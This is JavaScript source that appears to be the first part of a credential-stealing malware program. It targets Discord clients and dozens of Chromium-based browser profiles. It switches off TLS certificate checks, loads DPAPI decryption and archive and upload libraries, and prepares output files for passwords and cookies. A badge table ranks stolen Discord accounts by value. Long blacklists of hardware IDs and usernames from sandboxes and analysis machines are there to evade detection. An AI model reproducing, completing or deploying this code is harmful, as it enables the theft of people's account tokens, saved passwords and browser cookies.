process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const {
    Dpapi
} = require("@primno/dpapi");
const FormData = require("form-data");
const axios = require("axios");
const https = require("https");
const http = require("http");
const os = require("os");
const archiver = require("archiver");
const sqlite3 = require("sqlite3");
const {
    exec,
    execSync,
    execFile,
    spawn
} = require("child_process");
const WebSocket = require("ws");
const StreamZip = require("node-stream-zip");
const clearTimeoutFn = global.clearTimeout || clearTimeout;
const setTimeoutFn = global.setTimeout || setTimeout;
function getApiHeaders(a = "application/json") {
    return {
        "Content-Type": a,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };
}
function generateRandomString(len) {
    let result = "";
    for (let Dpapi = 0; Dpapi < fs; Dpapi++) {
        result += "0123456789".charAt(Math.floor(Math.random() * "0123456789".length));
    }
    return result;
}
let logs = "";
const tokens = [];
const discordEmails = [];
const local = process.env.LOCALAPPDATA;
const appdata = process.env.APPDATA;
const roaming = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;
const tempDir = os.tmpdir();
const identifier = generateRandomString(10);
const outputDir = path.join(tempDir, identifier);
const cookiesOutputDir = path.join(outputDir, "cookies");
const passwordsOutputPath = path.join(outputDir, "passwords.txt");
const paths = [{
    path: appdata + "\\discord\\",
    name: "Discord"
}, {
    path: appdata + "\\discordcanary\\",
    name: "Discord Canary"
}, {
    path: appdata + "\\discordptb\\",
    name: "Discord PTB"
}, {
    path: appdata + "\\discorddevelopment\\",
    name: "Discord Development"
}, {
    path: appdata + "\\lightcord\\",
    name: "Lightcord"
}, {
    path: localappdata + "\\Amigo\\User Data\\",
    name: "Amigo"
}, {
    path: localappdata + "\\Torch\\User Data\\",
    name: "Torch"
}, {
    path: localappdata + "\\Kometa\\User Data\\",
    name: "Kometa"
}, {
    path: localappdata + "\\Orbitum\\User Data\\",
    name: "Orbitum"
}, {
    path: localappdata + "\\CentBrowser\\User Data\\",
    name: "CentBrowser"
}, {
    path: localappdata + "\\7Star\\7Star\\User Data\\",
    name: "7Star"
}, {
    path: localappdata + "\\Sputnik\\Sputnik\\User Data\\",
    name: "Sputnik"
}, {
    path: localappdata + "\\Vivaldi\\User Data\\Default\\",
    name: "Vivaldi"
}, {
    path: localappdata + "\\Epic Privacy Browser\\User Data\\",
    name: "Epic Privacy Browser"
}, {
    path: localappdata + "\\uCozMedia\\Uran\\User Data\\Default\\",
    name: "Uran"
}, {
    path: localappdata + "\\Microsoft\\Edge\\User Data\\Default\\",
    name: "Edge (Default)"
}, {
    path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\",
    name: "Edge (Profile 1)"
}, {
    path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\",
    name: "Edge (Profile 2)"
}, {
    path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\",
    name: "Edge (Profile 3)"
}, {
    path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\",
    name: "Edge (Profile 4)"
}, {
    path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\",
    name: "Edge (Profile 5)"
}, {
    path: localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\",
    name: "Edge (Guest Profile)"
}, {
    path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\",
    name: "Yandex (Default)"
}, {
    path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
    name: "Yandex (Profile 1)"
}, {
    path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
    name: "Yandex (Profile 2)"
}, {
    path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
    name: "Yandex (Profile 3)"
}, {
    path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
    name: "Yandex (Profile 4)"
}, {
    path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
    name: "Yandex (Profile 5)"
}, {
    path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
    name: "Yandex (Guest Profile)"
}, {
    path: localappdata + "\\Iridium\\User Data\\Default\\",
    name: "Iridium"
}, {
    path: localappdata + "\\Google\\Chrome SxS\\User Data\\",
    name: "Chrome SxS"
}, {
    path: localappdata + "\\Google\\Chrome\\User Data\\Default\\",
    name: "Chrome (Default)"
}, {
    path: localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\",
    name: "Chrome (Profile 1)"
}, {
    path: localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\",
    name: "Chrome (Profile 2)"
}, {
    path: localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\",
    name: "Chrome (Profile 3)"
}, {
    path: localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\",
    name: "Chrome (Profile 4)"
}, {
    path: localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\",
    name: "Chrome (Profile 5)"
}, {
    path: localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\",
    name: "Chrome (Guest Profile)"
}, {
    path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
    name: "Brave (Default)"
}, {
    path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
    name: "Brave (Profile 1)"
}, {
    path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
    name: "Brave (Profile 2)"
}, {
    path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
    name: "Brave (Profile 3)"
}, {
    path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
    name: "Brave (Profile 4)"
}, {
    path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
    name: "Brave (Profile 5)"
}, {
    path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
    name: "Brave (Guest Profile)"
}];
const browserConfigs = {
    edge: {
        name: "Edge",
        bin: path.join(process.env.PROGRAMFILES || "", "Microsoft", "Edge", "Application", "msedge.exe"),
        binAlt: path.join(process.env["PROGRAMFILES(X86)"] || "", "Microsoft", "Edge", "Application", "msedge.exe"),
        userData: path.join(process.env.LOCALAPPDATA || "", "Microsoft", "Edge", "User Data")
    },
    brave: {
        name: "Brave",
        bin: path.join(process.env.PROGRAMFILES || "", "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        binAlt: path.join(process.env.LOCALAPPDATA || "", "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        userData: path.join(process.env.LOCALAPPDATA || "", "BraveSoftware", "Brave-Browser", "User Data")
    },
    vivaldi: {
        name: "Vivaldi",
        bin: path.join(process.env.LOCALAPPDATA || "", "Vivaldi", "Application", "vivaldi.exe"),
        binAlt: path.join(process.env.PROGRAMFILES || "", "Vivaldi", "Application", "vivaldi.exe"),
        userData: path.join(process.env.LOCALAPPDATA || "", "Vivaldi", "User Data")
    },
    yandex: {
        name: "Yandex",
        bin: path.join(process.env.LOCALAPPDATA || "", "Yandex", "YandexBrowser", "Application", "browser.exe"),
        binAlt: path.join(process.env.PROGRAMFILES || "", "Yandex", "YandexBrowser", "Application", "browser.exe"),
        userData: path.join(process.env.LOCALAPPDATA || "", "Yandex", "YandexBrowser", "User Data")
    },
    chromium: {
        name: "Chromium",
        bin: path.join(process.env.LOCALAPPDATA || "", "Chromium", "Application", "chrome.exe"),
        binAlt: path.join(process.env.PROGRAMFILES || "", "Chromium", "Application", "chrome.exe"),
        userData: path.join(process.env.LOCALAPPDATA || "", "Chromium", "User Data")
    },
    torch: {
        name: "Torch",
        bin: path.join(process.env.LOCALAPPDATA || "", "Torch", "Application", "torch.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "Torch", "User Data")
    },
    kometa: {
        name: "Kometa",
        bin: path.join(process.env.LOCALAPPDATA || "", "Kometa", "Application", "kometa.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "Kometa", "User Data")
    },
    orbitum: {
        name: "Orbitum",
        bin: path.join(process.env.LOCALAPPDATA || "", "Orbitum", "Application", "orbitum.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "Orbitum", "User Data")
    },
    centbrowser: {
        name: "CentBrowser",
        bin: path.join(process.env.LOCALAPPDATA || "", "CentBrowser", "Application", "chrome.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "CentBrowser", "User Data")
    },
    "7star": {
        name: "7Star",
        bin: path.join(process.env.LOCALAPPDATA || "", "7Star", "7Star", "Application", "7star.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "7Star", "7Star", "User Data")
    },
    sputnik: {
        name: "Sputnik",
        bin: path.join(process.env.LOCALAPPDATA || "", "Sputnik", "Sputnik", "Application", "sputnik.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "Sputnik", "Sputnik", "User Data")
    },
    epic: {
        name: "Epic",
        bin: path.join(process.env.LOCALAPPDATA || "", "Epic Privacy Browser", "Application", "epic.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "Epic Privacy Browser", "User Data")
    },
    uran: {
        name: "Uran",
        bin: path.join(process.env.LOCALAPPDATA || "", "uCozMedia", "Uran", "Application", "uran.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "uCozMedia", "Uran", "User Data")
    },
    iridium: {
        name: "Iridium",
        bin: path.join(process.env.LOCALAPPDATA || "", "Iridium", "Application", "iridium.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "Iridium", "User Data")
    },
    amigo: {
        name: "Amigo",
        bin: path.join(process.env.LOCALAPPDATA || "", "Amigo", "Application", "amigo.exe"),
        binAlt: null,
        userData: path.join(process.env.LOCALAPPDATA || "", "Amigo", "User Data")
    },
    opera: {
        name: "Opera",
        bin: path.join(process.env.LOCALAPPDATA || "", "Programs", "Opera", "opera.exe"),
        binAlt: null,
        userData: path.join(process.env.APPDATA || "", "Opera Software", "Opera Stable")
    },
    operagx: {
        name: "OperaGX",
        bin: path.join(process.env.LOCALAPPDATA || "", "Programs", "Opera GX", "opera.exe"),
        binAlt: null,
        userData: path.join(process.env.APPDATA || "", "Opera Software", "Opera GX Stable")
    }
};
const badges = {
    staff: {
        emoji: "<:staff:1362105228719034679>",
        id: 1,
        rare: true
    },
    active_developer: {
        emoji: "<:activedev:1362104965065212074>",
        id: 4194304,
        rare: false
    },
    early_supporter: {
        emoji: "<:pig:1362105166811103515>",
        id: 512,
        rare: true
    },
    verified_developer: {
        emoji: "<:dev:1362105068060676329>",
        id: 131072,
        rare: true
    },
    certified_moderator: {
        emoji: "<:mod:1362105108170539229>",
        id: 262144,
        rare: true
    },
    bug_hunter_level_1: {
        emoji: "<:bughunter1:1362105034157981758>",
        id: 8,
        rare: true
    },
    bug_hunter_level_2: {
        emoji: "<:bughunter2:1362105047462314293>",
        id: 16384,
        rare: true
    },
    partner: {
        emoji: "<:partner:1362105185094336622>",
        id: 2,
        rare: true
    },
    hypesquad_house_1: {
        emoji: "<:bravery:1362105004089147784>",
        id: 64,
        rare: false
    },
    hypesquad_house_2: {
        emoji: "<:brilliance:1362105019066748968>",
        id: 128,
        rare: false
    },
    hypesquad_house_3: {
        emoji: "<:balance:1362104986330202172>",
        id: 256,
        rare: false
    },
    hypesquad: {
        emoji: "<:events:1362105087006212456>",
        id: 4,
        rare: true
    },
    nitro: {
        emoji: "<a:nitro:1362115714185691186>",
        rare: false
    },
    nitro_bronze: {
        emoji: "<:bronze:1365454925357645994>",
        rare: false
    },
    nitro_silver: {
        emoji: "<:silver:1365454972962996254>",
        rare: false
    },
    nitro_gold: {
        emoji: "<:gold:1365454994337435739>",
        rare: false
    },
    nitro_platinum: {
        emoji: "<:emoji_3:1436738175509987378> ",
        rare: false
    },
    nitro_diamond: {
        emoji: "<:diamond:1365455075937488967>",
        rare: false
    },
    nitro_emerald: {
        emoji: "<:emerald:1365455096296509524>",
        rare: false
    },
    nitro_ruby: {
        emoji: "<:ruby:1365455125187137536>",
        rare: false
    },
    nitro_opal: {
        emoji: "<:opal:1365455150260551740>",
        rare: false
    },
    guild_booster_lvl1: {
        emoji: "<:boost1:1362104840250986667>",
        rare: false
    },
    guild_booster_lvl2: {
        emoji: "<:boost2:1362104851575607636>",
        rare: false
    },
    guild_booster_lvl3: {
        emoji: "<:boost3:1362104863084904830>",
        rare: false
    },
    guild_booster_lvl4: {
        emoji: "<:boost4:1362104873600024857>",
        rare: true
    },
    guild_booster_lvl5: {
        emoji: "<:boost5:1362104892226928812>",
        rare: true
    },
    guild_booster_lvl6: {
        emoji: "<:boost6:1362104904348467431>",
        rare: true
    },
    guild_booster_lvl7: {
        emoji: "<:boost7:1362104916247707658>",
        rare: true
    },
    guild_booster_lvl8: {
        emoji: "<:boost8:1362104931745530197>",
        rare: true
    },
    guild_booster_lvl9: {
        emoji: "<:boost9:1362104950938796164>",
        rare: true
    },
    quest_completed: {
        emoji: "<:quest:1362105209496801290>",
        rare: false
    }
};
const hwid = (() => {
    try {
        return execSync("WMIC csproduct get UUID").toString().trim().split("\n")[1];
    } catch {
        return null;
    }
})();
var hwidblack = ["00000000-0000-0000-0000-000000000000", "00000000-0000-0000-0000-50E5493391EF", "00000000-0000-0000-0000-AC1F6BD047A0", "00000000-0000-0000-0000-AC1F6BD04850", "00000000-0000-0000-0000-AC1F6BD048D6", "00000000-0000-0000-0000-AC1F6BD048DC", "00000000-0000-0000-0000-AC1F6BD048F8", "00000000-0000-0000-0000-AC1F6BD048FE", "00000000-0000-0000-0000-AC1F6BD04900", "00000000-0000-0000-0000-AC1F6BD0491C", "00000000-0000-0000-0000-AC1F6BD04926", "00000000-0000-0000-0000-AC1F6BD04928", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-AC1F6BD04976", "00000000-0000-0000-0000-AC1F6BD04978", "00000000-0000-0000-0000-AC1F6BD04986", "00000000-0000-0000-0000-AC1F6BD049B8", "00000000-0000-0000-0000-AC1F6BD04C0A", "00000000-0000-0000-0000-AC1F6BD04D06", "00000000-0000-0000-0000-AC1F6BD04D08", "00000000-0000-0000-0000-AC1F6BD04D8E", "00000000-0000-0000-0000-AC1F6BD04D98", "00000000-0000-0000-0000-AC1F6BD04DC0", "00000000-0000-0000-0000-AC1F6BD04DCC", "02AD9898-FA37-11EB-AC55-1D0C0A67EA8A", "032E02B4-0499-05C3-0806-3C0700080009", "03AA02FC-0414-0507-BC06-D70700080009", "03D40274-0435-05BF-D906-D20700080009", "03DE0294-0480-05DE-1A06-350700080009", "050C3342-FADD-AEDF-EF24-C6454E1A73C9", "05790C00-3B21-11EA-8000-3CECEF4400D0", "0700BEF3-1410-4284-81B1-E5C17FA9E18F", "07AF2042-392C-229F-8491-455123CC85FB", "07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9", "08C1E400-3C56-11EA-8000-3CECEF43FEDE", "0910CBA3-B396-476B-A7D7-716DB90F5FB9", "0934E336-72E4-4E6A-B3E5-383BD8E938C3", "0A36B1E3-1F6B-47DE-8D72-D4F46927F13F", "0A9D60D4-9A32-4317-B7C0-B11B5C677335", "0D748400-3B00-11EA-8000-3CECEF44007E", "0F377508-5106-45F4-A0D6-E8352F51A8A5", "104F9B96-5B46-4567-BF56-0066C1C6F7F0", "11111111-2222-3333-4444-555555555555", "119602E8-92F9-BD4B-8979-DA682276D385", "12204D56-28C0-AB03-51B7-44A8B7525250", "12EE3342-87A2-32DE-A390-4C2DA4D512E9", "138D921D-680F-4145-BDFF-EC463E70C77D", "13A61742-AF45-EFE4-70F4-05EF50767784", "14692042-A78B-9563-D59D-EB7DD2639037", "1AAD2042-66E8-C06A-2F81-A6A4A6A99093", "1B5D3FFD-A28E-4F11-9CD6-FF148989548C", "1D4D3342-D6C4-710C-98A3-9CC6571234D5", "213D2878-0E33-4D8C-B0D1-31425B9DE674", "222EFE91-EAE3-49F1-8E8D-EBAE067F801A", "26645000-3B67-11EA-8000-3CECEF440124", "2AB86800-3C50-11EA-8000-3CECEF440130", "2C5C2E42-E7B1-4D75-3EA3-A325353CDB72", "2CEA2042-9B9B-FAC1-44D8-159FE611FCCC", "2DD1B176-C043-49A4-830F-C623FFB88F3C", "2E6FB594-9D55-4424-8E74-CE25A25E36B0", "2F94221A-9D07-40D9-8C98-87CB5BFC3549", "2FBC3342-6152-674F-08E4-227A81CBD5F5", "34419E14-4019-11EB-9A22-6C4AB634B69A", "361E3342-9FAD-AC1C-F1AD-02E97892270F", "365B4000-3B25-11EA-8000-3CECEF44010C", "38813342-D7D0-DFC8-C56F-7FC9DFE5C972", "38AB3342-66B0-7175-0B23-F390B3728B78", "3A9F3342-D1F2-DF37-68AE-C10F60BFB462", "3EDC0561-C455-4D64-B176-3CFBBBF3FA47", "3F284CA4-8BDF-489B-A273-41B44D668F6D", "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E", "3FADD8D6-3754-47C4-9BFF-0E35553DD5FB", "40384E87-1FBA-4096-9EA1-D110F0EA92A8", "40F100F9-401C-487D-8D37-48107C6CE1D3", "418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED", "41B73342-8EA1-E6BF-ECB0-4BC8768D86E9", "42A82042-3F13-512F-5E3D-6BF4FFFD8518", "44B94D56-65AB-DC02-86A0-98143A7423BF", "4729AEB0-FC07-11E3-9673-CE39E79C8A00", "481E2042-A1AF-D390-CE06-A8F783B1E76A", "48941AE9-D52F-11DF-BBDA-503734826431", "49434D53-0200-9036-2500-369025000C65", "49434D53-0200-9036-2500-369025003865", "49434D53-0200-9036-2500-369025003A65", "49434D53-0200-9036-2500-369025003AF0", "49434D53-0200-9036-2500-369025005CF0", "49434D53-0200-9036-2500-36902500F022", "49434D53-0200-9065-2500-659025002274", "49434D53-0200-9065-2500-659025005073", "49434D53-0200-9065-2500-659025008074", "49434D53-0200-9065-2500-65902500E439", "499B0800-3C18-11EA-8000-3CECEF43FEA4", "4C4C4544-0050-3710-8058-CAC04F59344A", "4CB82042-BA8F-1748-C941-363C391CA7F3", "4CE94980-D7DA-11DD-A621-08606E889D9B", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "4DC32042-E601-F329-21C1-03F27564FD6C", "4EDF3342-E7A2-5776-4AE5-57531F471D56", "51646514-93E1-4CB6-AF29-036B45D14CBF", "52A1C000-3BAB-11EA-8000-3CECEF440204", "56B9F600-3C1C-11EA-8000-3CECEF4401DE", "59C68035-4B21-43E8-A6A6-BD734C0EE699", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6", "5CC7016D-76AB-492D-B178-44C12B1B3C73", "5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E", "5E573342-6093-4F2D-5F78-F51B9822B388", "5EBC5C00-3B70-11EA-8000-3CECEF4401DA", "5EBD2E42-1DB8-78A6-0EC3-031B661D5C57", "60C83342-0A97-928D-7316-5F1080A78E72", "612F079A-D69B-47EA-B7FF-13839CD17404", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "63DE70B4-1905-48F2-8CC4-F7C13B578B34", "63FA3342-31C7-4E8E-8089-DAFF6CE5E967", "64176F5E-8F74-412F-B3CF-917EFA5FB9DB", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "66729280-2B0C-4BD0-8131-950D86871E54", "66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B", "671BC5F7-4B0F-FF43-B923-8B1645581DC8", "67442042-0F69-367D-1B2E-1EE846020090", "67C5A563-3218-4718-8251-F38E3F6A89C1", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "686D4936-87C1-4EBD-BEB7-B3D92ECA4E28", "6881083C-EE5A-43E7-B7E3-A0CE9227839C", "69AEA650-3AE3-455C-9F80-51159BAE5EAE", "6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3", "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32", "6ECEAF72-3548-476C-BD8D-73134A9182C8", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "71522042-DA0B-6793-668B-CE95AEA7FE21", "72492D47-52EF-427A-B623-D4F2192F97D4", "73163342-B704-86D5-519B-18E1D191335C", "777D84B3-88D1-451C-93E4-D235177420A7", "782ED390-AE10-4727-A866-07018A8DED22", "79AF5279-16CF-4094-9758-F88A616D81B4", "7A484800-3B19-11EA-8000-3CECEF440122", "7AB5C494-39F5-4941-9163-47F54D6D5016", "7CA33342-A88C-7CD1-1ABB-7C0A82F488BF", "7D341C16-E8E9-42EA-8779-93653D877231", "7D6A0A6D-394E-4179-9636-662A8D2C7304", "7E4755A6-7160-4982-8F5D-6AA481749F10", "80152042-2F34-11D1-441F-5FADCA01996D", "83BFD600-3C27-11EA-8000-3CECEF4400B4", "844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6", "84782042-E646-50A0-159F-A8E75D4F9402", "84FE3342-6C67-5FC6-5639-9B3CA3D775A1", "84FEEFBC-805F-4C0E-AD5B-A0042999134D", "8703841B-3C5E-461C-BE72-1747D651CE89", "88DC3342-12E6-7D62-B0AE-C80E578E7B07", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "8DA62042-8B59-B4E3-D232-38B29A10964A", "8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603", "907A2A79-7116-4CB6-9FA5-E5A58C4587CD", "90A83342-D7E7-7A14-FFB3-2AA345FDBC89", "91625303-5211-4AAC-9842-01A41BA60D5A", "91A9EEDB-4652-4453-AC5B-8E92E68CBCF5", "921E2042-70D3-F9F1-8CBD-B398A21F89C6", "94515D88-D62B-498A-BA7C-3614B5D4307C", "95BF6A00-3C63-11EA-8000-3CECEF43FEB8", "96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE", "9921DE3A-5C1A-DF11-9078-563412000026", "9B2F7E00-6F4C-11EA-8000-3CECEF467028", "9C6D1742-046D-BC94-ED09-C36F70CC9A91", "9FC997CA-5081-4751-BC78-CE56D06F6A62", "A100EFD7-4A31-458F-B7FE-2EF95162B32F", "A15A930C-8251-9645-AF63-E45AD728C20C", "A19323DA-80B2-48C9-9F8F-B21D08C3FE07", "A1A849F7-0D57-4AD3-9073-C79D274EECC8", "A2339E80-BB69-4BF5-84BC-E9BE9D574A65", "A5CE2042-8D25-24C4-71F7-F56309D7D45F", "A6A21742-8023-CED9-EA8D-8F0BC4B35DEA", "A7721742-BE24-8A1C-B859-D7F8251A83D3", "A9C83342-4800-0578-1EE8-BA26D2A678D2", "AAFC2042-4721-4E22-F795-A60296CAC029", "ACA69200-3C4C-11EA-8000-3CECEF4401AA", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1", "B1112042-52E8-E25B-3655-6A4F54155DBF", "B22B623B-6B62-4F9B-A9D3-94A15453CEF4", "B5B77895-D40B-4F30-A565-6EF72586A14A", "B6464A2B-92C7-4B95-A2D0-E5410081B812", "B9DA2042-0D7B-F938-8E8A-DA098462AAEC", "BB233342-2E01-718F-D4A1-E7F69D026428", "BB64E044-87BA-C847-BC0A-C797D1A16A50", "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E", "BFE62042-E4E1-0B20-6076-C5D83EDFAFCE", "C0342042-AF96-18EE-C570-A5EFA8FF8890", "C249957A-AA08-4B21-933F-9271BEC63C85", "C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E", "C51E9A00-3BC3-11EA-8000-3CECEF440034", "C6B32042-4EC3-6FDF-C725-6F63914DA7C7", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "C9283342-8499-721F-12BE-32A556C9A7A8", "CC4AB400-3C66-11EA-8000-3CECEF43FE56", "CC5B3F62-2A04-4D2E-A46C-AA41B7050712", "CD74107E-444E-11EB-BA3A-E3FDD4B29537", "CE352E42-9339-8484-293A-BD50CDC639A5", "CEFC836C-8CB1-45A6-ADD7-209085EE2A57", "CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F", "D2DC3342-396C-6737-A8F6-0C6673C1DE08", "D4260370-C9F1-4195-95A8-585611AE73F2", "D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB", "D5DD3342-46B5-298A-2E81-5CA6867168BE", "D7382042-00A0-A6F0-1E51-FD1BBF06CD71", "D7958D98-A51E-4B34-8C51-547A6C2E6615", "D8C30328-1B06-4611-8E3C-E433F4F9794E", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D", "DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F", "DD45F600-3C63-11EA-8000-3CECEF440156", "DD9C3342-FB80-9A31-EB04-5794E5AE2B4C", "DEAEB8CE-A573-9F48-BD40-62ED6C223F20", "E08DE9AA-C704-4261-B32D-57B2A3993518", "E0C806ED-B25A-4744-AD7D-59771187122E", "E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5", "E2342042-A1F8-3DCF-0182-0E63D607BCC7", "E3BB3342-02A8-5613-9C92-3747616194FD", "E57F6333-A2AC-4F65-B442-20E928C0A625", "E67640B3-2B34-4D7F-BD62-59A1822DDBDC", "E6DBCCDF-5082-4479-B61A-6990D92ACC5F", "E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A", "EADD1742-4807-00A0-F92E-CCD933E9D8C1", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "F3EA4E00-3C5F-11EA-8000-3CECEF440016", "F5744000-3C78-11EA-8000-3CECEF43FEFE", "F5BB1742-D36D-A11E-6580-2EA2427B0038", "F5EFEEAC-96A0-11EB-8365-FAFE299935A9", "F68B2042-E3A7-2ADA-ADBC-A6274307A317", "F705420F-0BB3-4688-B75C-6CD1352CABA9", "F91C9458-6656-4E83-B84A-13641DE92949", "F9E41000-3B35-11EA-8000-3CECEF440150", "FA612E42-DC79-4F91-CA17-1538AD635C95", "FA8C2042-205D-13B0-FCB5-C5CC55577A35", "FBC62042-5DE9-16AD-3F27-F818E5F68DD3", "FC40ACF8-DD97-4590-B605-83B595B0C4BA", "FCE23342-91F1-EAFC-BA97-5AAE4509E173", "FE455D1A-BE27-4BA4-96C8-967A6D3A9661", "FED63342-E0D6-C669-D53F-253D696D74DA", "FF577B79-782E-0A4D-8568-B35A9B7EB76B", "9CFF2042-2043-0340-4F9C-4BAE6DC5BB39", "D7AC2042-05F8-0037-54A6-38387D00B767", "52562042-B33F-C9D3-0149-241F40A0F5D8", "3E9AC505-812A-456F-A9E6-C7426582500E", "11E12042-2404-040A-31E4-27374099F748", "6E963342-B9C8-2D14-B057-C60C35722AD4", "9EB0FAF6-0713-4576-BD64-813DEE9E477E", "0B8A2042-2E8E-BECC-B6A4-7925F2163DC9", "89E32042-1B2B-5C76-E966-D4E363846FD4", "699400A5-AFC6-427A-A56F-CE63D3E121CB", "2F230ED7-5797-4DB2-BAA0-99A193503E4B"];
var pcuserblack = ["05h00Gi0", "Bruno", "dreed", "eduardcarp", "skelly", "Frank", "3u2v9m8", "43By4", "seajones", "4tgiizsLimS", "6O4KyHhJXBiR", "7wjlGX7PjlW4", "8Nl0ColNQ5bq", "8VizSM", "Abby", "Amy", "AppOnFlySupport", "ASPNET", "azure", "BUiA1hkm", "BvJChRPnsxn", "cM0uEGN4do", "cMkNdS6", "DefaultAccount", "dOuyo8RV71", "DVrzi", "e60UW", "ecVtZ5wE", "EGG0p", "Frank", "fred", "G2DbYLDgzz8Y", "george", "GjBsjb", "Guest", "h7dk1xPr", "h86LHD", "Harry Johnson", "HEUeRzl", "hmarc", "ICQja5iT", "IVwoKUF", "j6SHA37KA", "j7pNjWM", "John", "jude", "Julia", "kEecfMwgj", "kFu0lQwgX5P", "KUv3bT4", "Lisa", "lK3zMR", "lmVwjj9b", "Louise", "Lucas", "mike", "Mr.None", "noK4zG7ZhOf", "o6jdigq", "o8yTi52T", "OgJb6GqgK0O", "patex", "PateX", "Paul Jones", "pf5vj", "PgfV1X", "PqONjHVwexsS", "pWOuqdTDQ", "PxmdUOpVyx", "QfofoG", "QmIS5df7u", "QORxJKNk", "qZo9A", "RDhJ0CNFevzX", "RGzcBUyrznReg", "S7Wjuf", "server", "SqgFOf3G", "Steve", "test", "TVM", "txWas1m2t", "umyUJ", "Uox1tzaMO", "User01", "w0fjuOVmCcP5A", "WDAGUtilityAccount", "XMiMmcKziitD", "xPLyvzr8sgC", "ykj0egq7fze", "DdQrgc", "ryjIJKIrOMs", "nZAp7UBVaS1", "zOEsT", "l3cnbB8Ar5b8", "xUnUy", "fNBDSlDTXY", "vzY4jmH0Jw02", "gu17B", "UiQcX", "21zLucUnfI85", "OZFUCOD6", "8LnfAai9QdJR", "5sIBK", "rB5BnfuR2", "GexwjQdjXG", "IZZuXj", "ymONofg", "dxd8DJ7c", "JAW4Dz0", "GJAm1NxXVm", "UspG1y1C", "equZE3J", "BXw7q", "lubi53aN14cU", "5Y3y73", "9yjCPsEYIMH", "GGw8NR", "JcOtj17dZx", "05KvAUQKPQ", "64F2tKIqO5", "7DBgdxu", "uHUQIuwoEFU", "gL50ksOp", "Of20XqH4VL", "tHiF2T", "sal.rosenburg"];
